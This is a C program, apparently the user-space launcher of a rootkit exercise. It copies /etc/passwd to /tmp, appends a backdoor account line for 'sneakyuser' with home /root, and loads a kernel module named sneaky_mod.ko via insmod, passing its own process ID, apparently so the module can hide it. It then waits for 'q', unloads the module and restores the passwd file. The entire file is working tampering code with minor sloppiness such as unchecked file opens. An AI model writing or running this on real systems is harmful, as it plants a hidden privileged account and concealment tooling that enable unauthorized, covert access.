#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void print_PID() {
    printf("sneaky_process pid = %d\n", getpid());
}

void cpfile(const char * fname_source, const char * fname_dest) {
    char ch;
    FILE * sf = fopen(fname_source, "r");
    FILE * df = fopen(fname_dest, "w");
    while ((ch=fgetc(sf)) != EOF) {
        fputc(ch, df);
    }
    fclose(sf);
    fclose(df);
}

void addMsg(const char * fname, const char * msg) {
    FILE * f = fopen(fname, "a");
    size_t len = strlen(msg);
    for (size_t i = 0; i < len; i++) {
        fputc(msg[i], f);
    }
    fclose(f);
}

void loadModule() {
    char buf[100];
    sprintf(buf, "insmod sneaky_mod.ko pid=%d", getpid());
    system(buf);
}

void loopForQuit() {
    while(1) {
        char ch;
        scanf("%c", &ch);
        if (ch == 'q') break;
    }
}

void unloadModule() {
    system("rmmod sneaky_mod.ko");
}

void printFile(const char * fname) {
    char ch;
    FILE * f = fopen(fname, "r");
    while ((ch=fgetc(f)) != EOF) {
        printf("%c", ch);
    }
    fclose(f);
}

int main(void) {
	// print my own process ID
    print_PID();
    // copy every from '/ect/passwd' to '/tmp/passwd'
    cpfile("/etc/passwd", "/tmp/passwd");
    // add one line to '/ect/passwd'
    addMsg("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
    // load the sneaky module
    loadModule();
    // looping reading for ‘q’
    loopForQuit();
    // unload the sneaky module
    unloadModule();
    // retore the '/etc/passwd' file
    cpfile("/tmp/passwd", "/etc/passwd");
}